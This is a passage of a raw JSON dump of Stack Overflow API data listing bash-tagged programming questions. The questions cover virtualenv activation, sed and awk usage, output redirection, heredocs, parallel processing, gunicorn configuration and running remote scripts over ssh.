'/app/gcc/4.3.4/bin:/app/firefox/3.6.12/LMWP3:/app/emacs/23.2/LMWP3/bin:/app/sametime/8.0.2:/app/nxclient/3.4.0.7/LMWP3/bin:/app/vim/7.3.021/LMWP3/bin:/app/xemacs/21.5.29/LMWP3/bin:/app/thunderbird/3.1.6/LMWP3:/app/thunderbird/3.1.6/LMWP3/bin:/app/openoffice/3.2.1/LMWP3/opt/openoffice.org3/program:/app/openoffice/3.2.1/LMWP3/openoffice.org3/program:/app/j2re/1.6.0_22/LMWP3/bin:/app/ica/client/11.1:/app/acroread/9.4.0/LMWP3/Adobe/Reader9/bin:/home/ebrfred/.afs/0/rbin:/home/ebrfred/.afs/0/pbin:/env/seln/bin:/home/ebrfred/.afs/0/ibin:/usr/atria/bin:/usr/afsws/bin:/usr/NX/bin:/usr/lib64/mpi/gcc/openmpi/bin:/usr/bin:/bin:/usr/sbin:/sbin:/opt/quest/bin:/usr/local/bin:/usr/bin/X11:/usr/X11R6/bin:/usr/games:/opt/kde3/bin:/usr/openwin/bin:/opt/cross/bin:/usr/lib/mit/bin:/usr/lib/mit/sbin:/opt/gnome/bin:/usr/lib/qt3/bin:/usr/dt/bin:/usr/ccs/bin:/app/arc/0/bin';setenv <em>LMFILES</em> '/env/common/modules/firefox/3.6.12:/env/common/modules/acroread/9.4.0:/env/common/modules/flashplayer/10.1:/env/common/modules/ica/11.1:/env/common/modules/j2re/1.6.0_22:/env/common/modules/openoffice/3.2.1:/env/common/modules/thunderbird/3.1.6:/env/common/modules/xemacs/21.5.29:/env/common/modules/vim/7.3.021:/env/common/modules/nxclient/3.4.0.7:/env/common/modules/sametime/8.0.2:/env/common/modules/emacs/23.2:/home/ebrfred/.afs/0/imodules/isit_modules:/env/common/modules/gmp/4.2.4:/env/common/modules/mpfr/2.4.0:/env/common/modules/gcc/4.3.4';setenv LOADEDMODULES 'firefox/3.6.12:acroread/9.4.0:flashplayer/10.1:ica/11.1:j2re/1.6.0_22:openoffice/3.2.1:thunderbird/3.1.6:xemacs/21.5.29:vim/7.3.021:nxclient/3.4.0.7:sametime/8.0.2:emacs/23.2:isit_modules:gmp/4.2.4:mpfr/2.4.0:gcc/4.3.4';setenv PKG_CONFIG_PATH '/app/gcc/4.3.4/lib/pkgconfig:/opt/gnome/lib64/pkgconfig:/opt/gnome/share/pkgconfig';+ exit 0</li>\n  </ul>\n</blockquote>\n"},{"tags":["python","bash","virtualenv"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":63,"score":-1,"question_id":13122137,"title":"How to source virtualenv activate in a Bash script","body":"<p>How do you create a Bash script to activate a Python virtualenv?</p>\n\n<p>I have a directory structure like:</p>\n\n<pre><code>.env\n    bin\n        activate\n        ...other virtualenv files...\nsrc\n    shell.sh\n    ...my code...\n</code></pre>\n\n<p>I can activate my virtualenv by:</p>\n\n<pre><code>user@localhost:src$ . ../.env/bin/activate\n(.env)user@localhost:src$\n</code></pre>\n\n<p>However, doing the same from a Bash script does nothing:</p>\n\n<pre><code>user@localhost:src$ cat shell.sh\n#!/bin/bash\n. ../.env/bin/activate\nuser@localhost:src$ ./shell.sh\nuser@localhost:src$ \n</code></pre>\n\n<p>What am I doing wrong?</p>\n"},{"tags":["bash","shell","awk"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":321,"score":2,"question_id":4804282,"title":"Setting FNR value in awk","body":"<p>Is there any way you can alter the default value of FNR and then output it to the screen.</p>\n\n<p>I have tried:</p>\n\n<pre><code>(piped output....) | awk '{FNR=0} {print $0, FNR}'\n</code></pre>\n\n<p>I am hoping that solution will be interhangeable with NR.</p>\n"},{"tags":["linux","bash","web-applications","chroot","lxc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13122860,"title":"execute terminal command in isolated unix environment","body":"<p>I am writing a webapplication in which users are able to execute git, bzr, and hg commands on the server.\nBasically, a user writes the git/bzr/hg command into a html form, hits a button, the command is sent to the server, and executed in the directory the user owns.</p>\n\n<p>How can I make this secure? I need to be able to execute a bash command which can only access and change one specific directory. And preferably, the directory in which the command is execute should not contain additional files. I think this is necessary for chroot.</p>\n"},{"tags":["bash","shared-libraries","music","wav","j"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13114133,"title":"playing WAV music from anywhere","body":"<p>Target: I want to play WAV music from program code</p>\n\n<p>features:</p>\n\n<ol>\n<li>don't want to use one of many libs [ffmpeg, SDL,...]</li>\n<li><p>such way: </p>\n\n<p>execve(\"aplay file.wav\") is too slow for me</p>\n\n<ul>\n<li>course i exec 'aplay' and load file on each execve</li>\n</ul></li>\n<li><p>the way : </p>\n\n<p>nc -l -p 12345 | aplay</p>\n\n<p>and then write raw WAV to socket may be a good idea, but aplay exit after 1st file</p></li>\n</ol>\n\n<p>(really I want to play WAV file from J, but don't want to make complex extern \"C\" init/load/play functions and then load it from shared library. Maybe there is a good and fast universal way to do that from any language using a socket and universe tool, or maybe there is lib for J which could do it, or some of the audio libs are very simple, maybe something else. )</p>\n"},{"tags":["linux","bash","unix","tar"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":9780956,"title":"tar the files in a directory and put the archive in another directory","body":"<p>I'm trying to tar all of the files in a directory (echo 1) to a tar archive called [directory name].tar in the archive directory (second echo). Is this correct ?</p>\n\n<pre><code>#!/bin/bash\n\n#Author\n#Josh\n++++++++++++++++++++++++++\necho \"Please enter the name of a folder to archive\" \n++++++++++++++++++++++++++\necho \"Please enter a foldername to store archives in\"\n++++++++++++++++++++++++++\ntouch fname\n+++++++++++++++++++++++++\ntar fname2.tar\n</code></pre>\n"},{"tags":["bash","sed","search-and-replace"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13112676,"title":"Search and replace with sed by both in pattern and line","body":"<p>I went through lots of similar posts but none could be applied to mine.</p>\n\n<p>I would like to search and replace using sed in some particular lines in a way that in only matches the <strong>first occurrence</strong>; lets say I have this part of the script:</p>\n\n<pre><code>processor  &lt;- read.table(\"../mall_all/adpcm/FULL_DB-constprop\", header=TRUE, colClasses=c(\"reassociate\"=\"factor\", \"scalarrepl\"=\"factor\", \"inline\"=\"factor\", \"sccp\"=\"factor\", \"loop_reduce\"=\"factor\"))\n\nprocessor&lt;-processor[-c(20:40)]\n\nprocessor$intensity &lt;- processor$int_high - processor$int_low\nprocessor$performance&lt;- processor$perf_high - processor$perf_low\nprocessor&lt;-processor[-c(1:4)]\nprocessor&lt;-processor[,!names(processor) %in% c(\"constprop\")]\n</code></pre>\n\n<p>I want to keep changing the <strong>$constprop</strong> variable in</p>\n\n<p><code>\"../mall_all/adpcm/FULL_DB-constprop\"</code></p>\n\n<p>AND </p>\n\n<pre><code>[,!names(processor) %in% c(\"constprop\")]\n</code></pre>\n\n<p>in a loop that I wrote, the problem is; I want the <strong>colClasses parameteres</strong> AND <strong>the rest of the scripts</strong> remains the same while entering the loop (the loop has the compiler options like: reassociate, inline, constprop, etc)</p>\n\n<p>I was wondering why my search and replace didn't work : </p>\n\n<pre><code>set -x\ncompilerOptionList=\"constprop dce inline instcombine licm loop_reduce loop_rotate loop_unroll loop_unswitch loop_unswitch mem2reg memcpyopt reassociate scalarrepl sccp simplifycfg \"\n\nstringToBeReplaced=constprop\n\nfor compilerOption in $compilerOptionList\ndo\n        echo \"Using compiler option: $compilerOption\"\n\n        //here you could see  the sed scripts\n\n        sed -i \"1,15  /FULL_DB/,/header/ s/$stringToBeReplaced/$compilerOption/\" r.scr\n        stringToBeReplaced=$compilerOption\n        make\n        mv Rplots.pdf Rplots_adpcm_$compilerOption.pdf\n        echo \"DONE! $compilerOption\"\ndone\n</code></pre>\n\n<p>Thanks all for your time and help ;)</p>\n\n<p>Amir</p>\n"},{"tags":["bash","unix","io-redirection"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":120,"score":1,"question_id":11013374,"title":"If redirecting STDERR to STDOUT and redirecting STDOUT to a file, why are STDERR messages not showing in the file?","body":"<p>I made a quick little script, test.sh, that looks like the following:</p>\n\n<pre><code>echo \"StdErr\" &gt; /dev/stderr\necho \"StdOut\" &gt; /dev/stdout\n</code></pre>\n\n<p>According to the answers to this <a href=\"http://stackoverflow.com/questions/637827/redirect-stderr-and-stdout-in-a-bash-script\">SO question</a>, and the <a href=\"http://tldp.org/LDP/abs/html/io-redirection.html\" rel=\"nofollow\">Advanced Bash-Scripting Guide</a>, the following should redirect stderr to stdout from the script above:</p>\n\n<pre><code>$ sh /tmp/test.sh 2&gt;&amp;1 \n</code></pre>\n\n<p>And indeed it does:</p>\n\n<pre><code>$ sh /tmp/test.sh 2&gt;&amp;1 |tee file;\n$ cat file\nStdErr\nStdOut\n</code></pre>\n\n<p>The question that I am wondering is where does the output from stderr go in the following code?</p>\n\n<pre><code>$ sh /tmp/test.sh &gt; file 2&gt;&amp;1\n$ cat file\nStdOut\n</code></pre>\n\n<p>I am using GNU bash, version 4.0.24(2)-release.</p>\n"}]}
{"total":16352,"page":5,"pagesize":100,"questions":[{"tags":["bash","unix","command-line","sed"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":57,"score":2,"question_id":13108503,"title":"Reverse input order with sed","body":"<p>I have a file, lets call it 'a.txt' and this file contains the following text line</p>\n\n<pre><code>do to what\n</code></pre>\n\n<p>I'm wondering what the SED command is to reverse the order of this text to make it look like</p>\n\n<pre><code>what to do\n</code></pre>\n\n<p>Do I have to do some sort of append? Like append 'do' to 'to' so it would look like</p>\n\n<p>to ++ do (used ++ just to make it clear)</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13121503,"title":"merge/concatenate based on a condition","body":"<p>I have two files I'm trying to join/merge based on columns 1 and 2.</p>\n\n<p><strong>input1</strong></p>\n\n<pre><code>22  42960000    rs149201999 A   AC  100 PASS    LDAF=0.0649;RSQ=0.8652;AN=2184;ERATE=0.0046;VT=SNP;AA=.;AVGPOST=0.9799;THETA=0.0149;SNPSOURCE=LOWCOV;AC=134;AF=0.06;ASN_AF=0.04;AMR_AF=0.05;AFR_AF=0.10;EUR_AF=0.06\n</code></pre>\n\n<p><strong>input2</strong></p>\n\n<pre><code>22  42960000    .   A   AC  .   .    ;AA=1;AFE=0.989691;ASNE=1;EUN=0.992509;AFW=1;MED=0.991071;LAT=1\n</code></pre>\n\n<p><strong>And output will be</strong></p>\n\n<pre><code>22  42960000    .   A   AC  .   .    ;AA=1;AFE=0.989691;ASNE=1;EUN=0.992509;AFW=1;MED=0.991071;LAT=1;LDAF=0.0649;RSQ=0.8652;AN=2184;ERATE=0.0046;VT=SNP;AA=.;AVGPOST=0.9799;THETA=0.0149;SNPSOURCE=LOWCOV;AC=134;AF=0.06;ASN_AF=0.04;AMR_AF=0.05;AFR_AF=0.10;EUR_AF=0.06\n</code></pre>\n\n<p>note each column is separated by tab.</p>\n"},{"tags":["bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13122147,"title":"Prevent expressions enclosed in backticks from being evaluated in heredocs","body":"<p>I have a text like this:</p>\n\n<pre><code>foo bar\n`which which`\n</code></pre>\n\n<p>If I do this using heredoc, I get a blank file:</p>\n\n<pre><code>➜  ~  echo &lt;&lt;EOT &gt; out\nheredoc&gt; foo bar\nheredoc&gt; `which which`\nheredoc&gt; EOT\n➜  ~  cat out\n\n➜  ~  \n</code></pre>\n\n<p>How can I do this?</p>\n\n<h3>Edit</h3>\n\n<p>Oh sorry, I meant to do <code>cat</code>. Problem is that it writes this to the file: <code>which: shell built-in command</code>, ie, evaluations backticks. Any way to do this without evaluating?</p>\n\n<p>With <code>cat</code>, I get</p>\n\n<pre><code>➜  ~  cat &lt;&lt;EOT &gt; out\nheredoc&gt; foo bar\nheredoc&gt; `which which`\nheredoc&gt; EOT\n➜  ~  cat out\nfoo bar\nwhich: shell built-in command\n➜  ~  \n</code></pre>\n\n<p>I don't want <code>which which</code> to be evaluated.</p>\n"},{"tags":["bash","script","gnu-screen"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13121871,"title":"Screen keeps terminating","body":"<p>I am trying to run a script in a screen that uses <code>inotifywait</code> to check for new files being created and then runs a script when an event that matches some parameters occurs. For some reason screen keeps terminating even though the script being run is looped.</p>\n\n<p>I start the screen with screen -d -m -S scriptname //path to .sh and the looped part of the script look like this</p>\n\n<pre><code>#start folder monitoring\nwhile fileevent=$(inotifywait -rq -e create $path_to_monitor); do CheckFileEvent; done\n</code></pre>\n"},{"tags":["python","django","bash","shell","gunicorn"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":33,"score":2,"question_id":13118362,"title":"gunicorn - not taking config file if executed from shell script","body":"<p>This is the code for my shell script : </p>\n\n<pre><code>#!/bin/bash  \nsource /path/to/active\ngunicorn_django -c /path/to/conf.py -D\n</code></pre>\n\n<p>The above sh file when executed, starts gunicorn process but it is not using the config file . </p>\n\n<p>But, if i execute the command directly from the command line, like </p>\n\n<pre><code>gunicorn_django -c path/to/conf.py -D\n</code></pre>\n\n<p>then it is using the config file . </p>\n\n<p>Also, in the sh file, if i give options directly like -w 3 -error-logfile etc.. then it is taking options .</p>\n"},{"tags":["bash","script","bacula"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13026892,"title":"Prevent security-query in bacula scripting","body":"<p>I'm trying to script bacula to delete old files that are not used any more. While there are over 1000 old files im not willing to do it manualy. </p>\n\n<p>How far I've come</p>\n\n<pre><code>for filename in $(echo \"list volume\" |bconsole |grep Purged |awk -F\\| '{print $3}')\ndo \n    echo \"delete volume=2012-10-19_23h40m\" | bconsole\ndone\n</code></pre>\n\n<p>But now I have the problem of the security question where someone have to enter \"yes\"/\"no\". </p>\n\n<blockquote>\n  <p>Are you sure you want to delete Volume \"2012-10-19_23h40m\"? (yes/no)</p>\n</blockquote>\n\n<p>But the bconsole program is just exiting!</p>\n\n<p>Any ideas?</p>\n"},{"tags":["linux","bash","cp"],"answer_count":5,"favorite_count":3,"up_vote_count":21,"down_vote_count":0,"view_count":20080,"score":21,"question_id":947954,"title":"what's the option for cp to create a directory if not exists?","body":"<p>Here is what I tried but failed:</p>\n\n<pre><code>[root@file nutch-0.9]# cp -f urls-resume /nosuchdirectory/hi.txt\ncp: cannot create regular file `/nosuchdirectory/hi.txt': No such file or directory\n[root@file nutch-0.9]#\n</code></pre>\n\n<p>besides,any way to make \">\" work that way,say to create a directory when need?</p>\n\n<pre><code>[root@file nutch-0.9]# echo test &gt; /nosuchtest/hi.txt\n-bash: /nosuchtest/hi.txt: No such file or directory\n</code></pre>\n"},{"tags":["regex","bash","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":13118609,"title":"Making regular expressions look nice in shell scripts","body":"<p>I often use grep and sed in my bash scripts.\nFor example, I use a script to remove comments from a template</p>\n\n<p>In this example the comments look like:</p>\n\n<pre><code>/*#  my comments contain text and ascii art:\n *#\n *#  [box1] ------&gt; [box2]o\n *#\n#*/\n</code></pre>\n\n<p>My sed chain to remove these lines looks like:</p>\n\n<pre><code>sed '/^\\/\\*#/d' | sed '/^\\s*\\*#/d' | sed '/^\\s*#\\*\\//d'\n</code></pre>\n\n<p>I my scripts, I have to escape chars such as <code>\\</code> and <code>/</code>, which makes the code less readable. Therefore, my question is: <strong>How can I write nice-to-read regular expressions for <code>sed</code> in bash scripts?</strong></p>\n\n<p>One way, I can think of, is by using another separator instead of <code>/</code>, as in vim where you can natively use <code>%s#search/text#replace/text#gc</code> (using <code>#</code> the as separator) and therefore allow <code>/</code> as unescaped character. Defining an alternative escape char would also help. I would be interested in how you solve this problem. I am also open for alternative tools in case you think it is only a <code>sed</code> problem.</p>\n"},{"tags":["bash","parallel-processing"],"answer_count":2,"favorite_count":4,"up_vote_count":9,"down_vote_count":0,"view_count":3709,"score":9,"question_id":3811943,"title":"Doing parallel processing in bash?","body":"<p>I've thousands of png files which I like to make smaller with <code>pngcrush</code>. I've a simple <code>find .. -exec</code> job, but it's sequential. My machine has quite some resources and I'd make this in parallel.</p>\n\n<p>The operation to be performed on every png is:</p>\n\n<pre><code>pngcrush input output &amp;&amp; mv output input\n</code></pre>\n\n<p>Ideally I can specify the maximum number of parallel operations.</p>\n\n<p>Is there a way to do this with bash and/or other shell helpers? I'm Ubuntu or Debian.</p>\n"},{"tags":["bash","ssh"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13117146,"title":"Bash script to fetch log files from dev and production fails","body":"<p>I've pieced together the following script:</p>\n\n<p><code>ssh -2 -l root devserver \"cd /var/log/httpd; ls | grep -v 'gz' | xargs -- tail -n 15\"</code></p>\n\n<p>This logs on to the devserver, chagnes directory to the httpd logs, lists them, removes the hundreds of compressed historical rotations, then pipes this in to tail. </p>\n\n<p>Makes it easy to see what sort of errors are occurring. This works when I ssh in myself, then execute the commands in quotes. However, when using this as a script the output from production is garbled and I get notice chimes on dev, almost like it's treating the output like a command rather than simple text.</p>\n\n<p>I'm sure there's some escaping or somesuch I'm missing.</p>\n\n<p>Notes:\n- SSHing in as root because the httpd logs aren't readable by the usual ssh user. \n- Because tail failed to find the files piped in from grep when I wasn't in the directory in question.</p>\n"},{"tags":["bash","command-line"],"answer_count":4,"favorite_count":30,"up_vote_count":114,"down_vote_count":0,"view_count":75641,"score":114,"question_id":255898,"title":"How to iterate over arguments in bash script","body":"<p>I have a complex command that I'd like to make a shell/bash script of.  I can write it in terms of <code>$1</code> easily:</p>\n\n<pre><code>foo $1 args -o $1.ext\n</code></pre>\n\n<p>I want to be able to pass multiple input names into the script - what's the right way to do this?  Of course I want to handle filenames with spaces in them.</p>\n"},{"tags":["bash","shell","zsh","exit-code"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12999830,"title":"Getting exit code of last shell command in another script","body":"<p>I am trying to beef up my notify script. The way the script works is that I put it behind a long running shell command and then all sorts of notifications get invoced after the longrunning script finished.</p>\n\n<p>For example:</p>\n\n<pre><code>sleep 100; my_notify\n</code></pre>\n\n<p>It would be nice to get the exit code of the long running script, the problem is that calling <code>my_notify</code> creates a new process that does not have access to the <code>$?</code> variable.</p>\n\n<p>Compare:</p>\n\n<pre><code>~ $: ls nonexisting_file; echo \"exit code: $?\"; echo \"PPID: $PPID\"\nls: nonexisting_file: No such file or directory\nexit code: 1\nPPID: 6203\n</code></pre>\n\n<p>vs.</p>\n\n<pre><code>~ $: ls nonexisting_file; my_notify      \nls: nonexisting_file: No such file or directory\nexit code: 0\nPPID: 6205\n</code></pre>\n\n<p>The <code>my_notify</code> script has the following in it:</p>\n\n<pre><code>#!/bin/sh\necho \"exit code: $?\"\necho \"PPID: $PPID\"\n</code></pre>\n\n<p>I am looking for a way to get the exit code of the previous command without changing the structure of the command too much. I am aware of the fact that if I change it to work more like <code>time</code>, e.g. <code>my_notify longrunning_command...</code> my problem would be solved, but I actually like that I can tack it at the end of a command and I fear complications of this second solution.</p>\n\n<p>Can this be done or is it fundamentally incompatible with the way that shells work?</p>\n\n<p>My shell is <code>zsh</code> but I would like it to work with <code>bash</code> as well.</p>\n"},{"tags":["linux","bash","tcl","ns2"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13112831,"title":"Parameters in TCL using ns2","body":"<p>how can i sent this values </p>\n\n<pre><code>24.215729\n24.815729\n25.055134\n27.123499\n27.159186\n28.843474\n28.877798\n28.877798\n</code></pre>\n\n<p>to tcl input argument?\nas you know we cant use pipe command because tcl dosent accept in that way!\nwhat can i do to store this numbers in tcl file(the count of this numbers in variable and can be 0 to N and in this example its 7)</p>\n"},{"tags":["django","bash","shell","gunicorn"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13117000,"title":"shell script - store output of \"kill -HUP 1234\" (gunicorn command) to variable and check if the variable contains \"No such process\"","body":"<p>I tried below command to store output to variable : </p>\n\n<pre><code>k=$(kill -HUP 1234)  #command getting executed but not storing to variable\necho \"$k\"\n</code></pre>\n\n<p>For checking if the output contains the word, i can do like this  :</p>\n\n<pre><code>  if [[ outputvar =~ .*No such process*. ]]\n</code></pre>\n\n<p>As per the examples, above should work , but i donno why its not working . Can you tell me correct way so that if I cannot restart the process, I can atleast start a new process with direct gunicorn_django command </p>\n"},{"tags":["bash"],"answer_count":9,"favorite_count":15,"up_vote_count":45,"down_vote_count":0,"view_count":10884,"score":45,"question_id":1885525,"title":"How do I prompt a user for confirmation in bash script?","body":"<p>I want to put a quick \"are you sure?\" prompt for confirmation at the top of a potentially dangerous bash script, what's the easiest/best way to do this?</p>\n"},{"tags":["bash","shell","script","timeout"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13115419,"title":"How to timeout within a bash script?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/687948/timeout-a-command-in-bash-without-unnecessary-delay\">Timeout a command in bash without unnecessary delay</a>  </p>\n</blockquote>\n\n\n\n<p>So this is what I am trying to do -</p>\n\n<pre><code>for test in `ls Tests`; do\n\nfor file in `ls FileFolder`; do\n\noutput=`python devcap $test $file`\n\necho $test $file $output &gt;&gt;result.txt\n\ndone\n\ndone\n</code></pre>\n\n<p>How do I timeout the $output if it takes longer than say 5 seconds and move to the next $file?</p>\n\n<p>Can I redirect the stderr to result.txt as well?</p>\n"},{"tags":["linux","bash","sorting"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":5955,"score":0,"question_id":537191,"title":"The sort -R command doesn't sort lines randomly in Linux","body":"<p>I can't get --random-sort to work with the sort command on a Fedora Linux-system.</p>\n\n<p>Some context information:</p>\n\n<pre><code>$ cat /etc/fedora-release\nFedora release 7 (Moonshine)\n$ which sort\n/bin/sort\n$ man sort | grep -A 2 '\\-R'\n       -R, --random-sort\n              sort by random hash of keys\n\n$ man sort | grep -A 3 '\\-R'\n       -R, --random-sort\n              sort by random hash of keys\n\n       --random-source=FILE\n</code></pre>\n\n<p>And the test:</p>\n\n<pre><code>$ echo -e \"2\\n1\\n3\\n5\\n4\"\n2\n1\n3\n5\n4\n$ echo -e \"2\\n1\\n3\\n5\\n4\" | sort -r # Sort in reverse order\n5\n4\n3\n2\n1\n$ echo -e \"2\\n1\\n3\\n5\\n4\" | sort -R # Sort in random order\n1\n2\n3\n4\n5\n$ # Fail! That's not random (I've tried it multiple times.)\n</code></pre>\n"},{"tags":["java","linux","bash","unix","script"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":45,"score":2,"question_id":13113462,"title":"Bash multi input Java tester","body":"<p>I am currently trying to make a bash testing script that will...</p>\n\n<p>1) Go into many peoples folders</p>\n\n<p>2) Compile their two java files</p>\n\n<p>3) Run two quick tests for the the compiled results and send the output to a file to be saved in their folder</p>\n\n<p>4) Take the results of those four result files, and dump them into one result file with a template at the top for me to input the results</p>\n\n<p>... and I currently have most of this done. My only issue is that their program asks for a couple lines of input, for example...</p>\n\n<p>Input num 1: </p>\n\n<p>Input num 2:</p>\n\n<p>Input num 3:</p>\n\n<p>... and so on, and I am not sure how to get it to continue putting input into their program. Do I need an EOF after my hard coded input in my bash file?? Here is what I have so far...</p>\n\n<pre><code>#! /bin/bash\n\n\nfor i in $(find . -maxdepth 1 -type d)\ndo\n\n    pwd\n    pushd \"$i\"\n    pwd\n\n    if [ -f \"First.java\" ];\n    then\n        javac -cp . First.java\n        echo easyFirst.txt | java -cp . First - &gt; easyFirstResult\n        echo hardFirst.txt | java -cp . First - &gt; hardFirstResult\n    fi\n\n    if [ -f \"Second.java\" ];\n    then\n        javac -cp . Second.java\n        echo easySecond | java -cp . Second - &gt; easySecondResult\n        echo hardSecond | java -cp . Second - &gt; hardSecondResult\n    fi\n\n\n    printf \"easyFirstResult\\t: \\hardFirstResult\\t: \\easySecondResult\\t: \\hardSecondResult\\t: \" &gt; lab5grade.txt\n\n    popd\n\ndone\n</code></pre>\n\n<p>P.S. Everything is working besides the multi-line input, and I have two text files with my hard coded input to test the code.</p>\n\n<p>Thanks!</p>\n"},{"tags":["bash","shell","pipes"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13111633,"title":"Write mplayer's output to fifo and read it","body":"<p>I'm trying write simple notify app in bash. I want to read output from mplayer, parse it and display through notify-send.</p>\n\n<p>I can get desired info from mplayer using this:</p>\n\n<pre><code>mplayer &lt;url&gt; | grep ICY\n</code></pre>\n\n<p>and then parse in using sed.</p>\n\n<p>I create named pipe, tell mplayer to write it and then I'm reading from it. Unfortunately, it doesn't work. Here's my script:</p>\n\n<pre><code>$fifo=~/.rp/fifo\nmkfifo $fifo\n\nmplayer &lt;url&gt; 2&gt;/dev/null | grep ICY 1&gt; $fifo &amp;\n\nwhile read line &lt; $fifo; do\n    echo $line\ndone\n\nwait\n</code></pre>\n\n<p>Program keeps waiting to input from $fifo. I tried following in other terminal, while this script is running:</p>\n\n<ol>\n<li><p>Run</p>\n\n<pre><code>echo \"Test\" &gt; .rp/fifo\n</code></pre>\n\n<p>Terminal with running script shows \"Test\"</p></li>\n<li><p>Run</p>\n\n<pre><code>echo \"ICY\" | grep ICY &gt; .rp/fifo\n</code></pre>\n\n<p>also works.</p></li>\n<li><p>Run</p>\n\n<pre><code>mplayer &lt;url&gt; | grep ICY &gt; .rp/fifo\n</code></pre>\n\n<p>and it <strong>doesn't</strong> work.</p></li>\n</ol>\n\n<p>Is I said above, the combination of mplayer | grep works fine. grep > $fifo works fine. I don't understand why mplayer | grep > $fifo doesn't work. </p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13111413,"title":"bash complete from two sources, folders and keys from array","body":"<p>I am trying to define a bash function, <code>mycd</code>. This function uses an associative array <code>mycdar</code>. If the key exists in the array the function will change directory to the corresponding value of the key. If the key doesn't exist it will change to the dir provided in the command line.</p>\n\n<p>What I would like to do is to have completion for this function, from both they keys of the associated array or from the folders existing in the current directory.</p>\n\n<p>Thank you.</p>\n"},{"tags":["bash","ssh","nohup","mutt"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":1716,"score":4,"question_id":4113168,"title":"starting remote script via ssh containing nohup","body":"<p>I want to start a script remotely via ssh like this:</p>\n\n<pre><code>ssh user@remote.org -t 'cd my/dir &amp;&amp; ./myscript data my@email.com'\n</code></pre>\n\n<p>The script does various things which work fine until it comes to a line with nohup:</p>\n\n<pre><code>nohup time ./myprog $1 &gt;my.log &amp;&amp; mutt -a ${1%.*}/`basename $1` -a ${1%.*}/`basename ${1%.*}`.plt $2 &lt; my.log 2&gt;&amp;1 &amp;\n</code></pre>\n\n<p>it is supposed to do start the program myprog, pipe its output to mylog and send an email with some datafiles created by myprog as attachment and the log as body. Though when the script reaches this line, ssh outputs:</p>\n\n<blockquote>\n  <p>Connection to remote.org closed.</p>\n</blockquote>\n\n<p>What is the problem here?</p>\n\n<p>Thanks for any help</p>\n"},{"tags":["linux","bash","command-line","newline"],"answer_count":4,"favorite_count":4,"up_vote_count":6,"down_vote_count":0,"view_count":6422,"score":6,"question_id":3569997,"title":"View line-endings in a text file","body":"<p>I'm trying to use something in bash to show me the line endings in a file printed rather than interrupted. The file is a dump from SSIS/SQL Server being read in by a Linux machine for processing.</p>\n\n<p>Is there any switches within <code>vi</code>, <code>less</code>, <code>more</code>, etc?</p>\n\n<p>In addition to seeing the line-endings, I need to know what type of line end it is (CRLF or LF).</p>\n"},{"tags":["linux","bash","grep","wc"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":39,"score":3,"question_id":13112475,"title":"get count of the word in all files","body":"<p>I have a directory tree with a bunch of folders and subfolders in it and a bunch of files in those sub folders. I need to get the count of the word 'Hello' in each of those files and display the result as 'File 'a' has 'Hello' n times', 'File 'b' has 'Hello' m times' and so on. How do i write a script in linux, so that i can get the word count for the word hello in each of these files. I have tried some grep combinations with 'wc' after browsing through net , but that gave me the total count from all the files in all the folders.</p>\n\n<p>Thanks </p>\n"},{"tags":["bash","virtualenvwrapper"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13111881,"title":"Scripting virtualenvwrapper mkvirtualenv","body":"<p>I'm writing a <a href=\"http://github.com/greenmoss/NotOrion\" rel=\"nofollow\">game</a> in python 2.7, and want to script the \"bootstrap\" of my game's development environment, and then invoke <a href=\"https://github.com/seomoz/shovel\" rel=\"nofollow\">shovel</a>. If virtualenvwrapper is not detected, I will use a <a href=\"http://stackoverflow.com/questions/4324558/whats-the-proper-way-to-install-pip-virtualenv-and-distribute-for-python\">virtualenv bootstrap solution</a>. However if virtualenvwrapper <strong>is</strong> detected, I would like to use it instead.</p>\n\n<p>The problem is that the virtualenvwrapper inline shell functions are not inherited by my bootstrap script. As far as I know, that rules out running something like \"mkvirtualenv NotOrion\". Since the environment variable \"VIRTUALENVWRAPPER_VIRTUALENV\" <strong>is</strong> set (in my case, from <a 